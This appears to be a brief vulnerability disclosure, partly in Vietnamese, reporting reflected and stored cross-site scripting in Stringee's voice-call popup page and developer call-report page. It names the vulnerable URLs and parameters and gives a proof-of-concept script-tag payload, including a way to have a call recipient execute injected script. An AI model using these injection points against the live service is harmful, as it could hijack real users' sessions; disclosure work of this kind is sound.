# Reflected XSS + Stored XSS




## Reflected XSS 

Endpoint : https://static.stringee.com/button-call/lastest/videocall/popup_voicecall.html?from_number=[xss]

Inject : ```<script>alert(1)</script>```

![](/Reflected_XSS.jpg)


## Stored XSS

Url : https://developer.stringee.com/report/call

Inject : ```<script>alert(1)</script>```

Tạo một access_token để thực hiện cuộc gọi thay đổi tên người cuộc gọi = inject ==> người nhận bị xss

Endpoint : 

```
https://static.stringee.com/button-call/lastest/videocall/popup_voicecall.html
?from_number=[xss]
&to_number=84936423493
&call_type=free-voice-call
&access_token=[secret]
&hotline=[victim]

```

Inject : ```<script>alert(1)</script>```

![](/Reflected_XSS.jpg)